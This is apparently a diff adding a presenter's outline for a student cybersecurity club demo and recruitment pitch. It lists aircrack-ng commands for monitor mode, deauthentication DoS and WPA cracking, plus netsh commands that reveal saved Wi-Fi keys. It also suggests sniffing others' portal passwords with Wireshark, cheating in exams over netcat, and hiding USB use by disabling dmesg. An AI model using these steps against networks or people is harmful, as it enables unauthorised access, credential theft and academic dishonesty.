@@ -1,0 +1,100 @@
+Start off by introducing CyberCell , myself and its members 
+
+"This is merely a demonstration to give you all an idea as to what the 
+ Cyber Cell is all about and what we do . We simulate in our labs some of the 
+ latest and sophistaced hacks to learn about existing vulnerabilities and
+ security issues and thus to come up with patches , precautionary measures 
+ and solutions in an ethical manner " 
+
+1) First off classic Wifi hack 
+
+Steps : 
+1) ifconfig wlan0 down
+2) airmon-ng check kill
+3) iwconfig wlan0 mode monitor
+4) ifconfig wlan0 up
+5) airodump-ng wlan0
+6) airodump-ng --bssid <MAC-ADDR> --channel <CHANNEL> -w <NAME_OF_FILE> wlan0
+7) aireplay-ng -0 0 -a <MAC-ADDR> wlan0  <= DoS attack 
+8) crunch
+9) aircrack-ng
+
+Then to fix network manager => sudo service network-manager restart
+
+
+In windows , netsh wlan show profile <= shows wifi having connected to in past
+	     netsh wlan show profile <WifiName> key=clear <= reveals password at Security key 
+Useful when someone enters password in your device but doesn't want to let you know it .
+
+
+
+2) Next , have you guys used the 10.125.130.101:8090 to gain internet access ?
+   Well , it can show some of your sensitive info . If anyone else gets your password
+   that person can put you in serious trouble ...
+   What if you wanted to put someone in serious trouble , you can use Wireshark to 
+   get that person's password like this : 
+    [ invite some one to enter their login credentials and remind them to change it later ]
+
+
+
+
+
+
+3) Next , let's do something very interesting . I'll let you all on a secret .
+   There is a method to cheat during practical exams :
+   
+	Netcat for chat ( communication )
+		   transfer programs 
+
+
+4) Command over-ride 
+	Sometimes people bring all programs on their USB sticks , attach it and get caught due 
+	to command => dmesg -T
+
+	We created a script that you can use to disable the command
+
+
+5) 	Which OS do you think is more secure Windows or Linux ?
+	( Most will probably think that Linux is more secure )
+	
+	Well , we have created a small virus .
+	What does the ls command do ?
+	
+	As well as an antivirus for it .
+
+
+
+6)	I believe all of you have started with C++ programming .
+	Great ! 
+	At our labs , we have developed a virus that completely modifies the 
+	behaviour of the g++ compiler .
+
+
+
+7)  
+
+
+
+
+
+
+
+==================================================================================
+
+Requirements to join Cyber cell
+1) Love for tech
+2) Mental grit
+3) Ability to learn new stuff , fast and thoroughly 
+4) Ethics (very important)
+
+Process : 
+1) Technical round
+2) Interview 
+
+
+Why to join Cyber Cell
+	1) Here you will learn necessary skills for future
+	2) Huge demand and very short supply of Cyber security professionals
+	   Capegemini report : 3.5 million shortfall by 2021 , ie : by the time you graduate
+	3) Market flooded with crappy developers ( Android , Web etc .) 
+	4) Salary nearly 3 times other IT professionals 
